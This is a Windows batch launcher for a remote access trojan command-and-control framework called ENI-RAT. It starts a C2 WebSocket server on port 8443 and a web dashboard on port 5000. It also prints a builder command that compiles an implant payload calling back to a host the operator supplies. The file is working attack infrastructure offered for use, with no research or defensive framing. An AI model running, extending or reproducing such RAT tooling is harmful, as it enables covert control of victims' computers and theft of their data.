@echo off
chcp 65001 >nul
title ENI-RAT C2 Server
echo ========================================
echo   ENI-RAT C2 Framework - Fixed Edition
echo ========================================
echo.
echo Starting C2 WebSocket (port 8443)...
start "ENI-RAT C2" /min cmd /c "set PYTHONIOENCODING=utf-8 && python server\c2_core.py"
echo Starting API & Web Dashboard (port 5000)...
start "ENI-RAT API" /min cmd /c "set PYTHONIOENCODING=utf-8 && python server\api_server.py"
timeout /t 3 /nobreak >nul
echo.
echo ========================================
echo   Web Dashboard: http://127.0.0.1:5000
echo   WS Endpoint:   ws://127.0.0.1:8443
echo.
echo   Build Payload:
echo     python builder\builder.py --host YOUR_IP --compile
echo ========================================
echo.
echo Press any key to open web dashboard...
pause >nul
start http://127.0.0.1:5000
